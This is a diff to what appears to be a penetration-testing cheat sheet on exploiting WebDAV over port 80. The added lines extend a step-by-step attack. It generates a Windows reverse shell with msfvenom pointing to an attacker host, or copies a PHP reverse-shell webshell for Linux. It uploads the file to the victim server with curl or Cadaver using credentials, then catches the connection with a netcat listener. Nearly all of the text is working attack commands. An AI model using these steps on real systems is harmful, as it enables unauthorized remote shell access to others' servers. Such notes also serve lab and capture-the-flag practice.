@@ -10,12 +10,23 @@ Port 80
 
 #### 1. Generate a reverse shell
 
+Windows machine
+
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
+
+Linux machine
+
+    cp /usr/share/webshells/php/php-reverse-shell.php .
 
 #### 2. Upload payload via WebDAV
 
     curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
 
+OR in Cadaver
+
+    put shell.aspx
+    put php-reverse-shell.php
+    
 #### 3. Start the listener
 
     nc -lvnp 80
